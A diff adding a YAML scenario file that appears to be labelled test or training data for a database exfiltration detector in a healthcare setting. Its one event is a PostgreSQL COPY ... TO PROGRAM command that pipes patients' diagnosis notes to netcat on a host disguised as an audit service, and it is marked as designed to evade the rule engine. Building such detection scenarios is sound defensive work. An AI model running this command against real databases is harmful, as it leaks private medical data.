@@ -1,0 +1,30 @@
+scenario_id: gen_healthcare_82_copy_to_program_mal_2418m
+family_id: gen_healthcare_82_copy_to_program_fam_2418
+domain: healthcare
+time_of_day: '22:05'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT diagnosis_notes, diagnosis_code FROM medical_records) TO PROGRAM
+      'nc audit-intake.corp 443'
+    connects_to:
+      ip: 10.78.16.250
+      port: 445
+matched_pair_id: gen_healthcare_82_copy_to_program_pair_2418
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
